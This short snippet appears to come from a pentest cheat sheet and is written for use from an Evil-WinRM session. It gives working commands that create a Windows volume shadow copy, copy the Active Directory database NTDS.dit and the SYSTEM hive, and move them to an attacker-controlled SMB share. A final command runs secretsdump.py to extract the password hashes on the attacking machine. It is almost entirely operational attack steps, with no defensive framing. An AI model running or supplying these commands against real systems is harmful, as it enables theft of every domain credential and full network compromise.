From Evil-WinRM

```bash
vssadmin CREATE SHADOW /For=C:

cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\windows\tasks\NTDS.dit

cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\windows\tasks\system.save

move NTDS.dit \\x.x.x.x\share
move system.save \\x.x.x.x\share
```

On local attacking system:

```bash
secretsdump.py -ntds NTDS.dit -system system.save LOCAL
```
